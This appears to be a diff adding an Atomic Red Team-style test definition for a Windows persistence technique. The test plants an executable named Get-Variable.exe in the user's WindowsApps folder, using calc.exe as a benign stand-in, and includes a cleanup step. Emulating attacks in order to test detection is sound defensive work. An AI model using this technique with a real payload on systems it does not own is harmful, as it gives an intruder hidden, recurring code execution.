@@ -1,0 +1,26 @@
+attack_technique: Get-Variable Persistence
+display_name: Get-Variable Persistence
+atomic_tests:
+- name: Get-Variable Persistence
+  auto_generated_guid: a3128a94-432d-4d46-a54c-9fa3f27bafa0
+  description: |
+    Attackers can load thier executables with every powershell startup or running Get-Variable cmdlet by writing Get-Variable.exe in specific paths
+  supported_platforms:
+  - windows
+  input_arguments:
+    PathToEXE:
+      description: The copied executable
+      type: Path
+      default: c:\windows\system32\calc.exe
+    DestinationPath:
+      description: DestinationPath
+      type: Path
+      default: C:\Users\$env:username\AppData\Local\Microsoft\WindowsApps\Get-Variable.exe
+  executor:
+    command: |
+      Copy-item -Path #{PathToEXE} -Destination #{DestinationPath}
+   
+    cleanup_command: |
+      remove-item  #{DestinationPath}
+    name: powershell
+    elevation_required: false
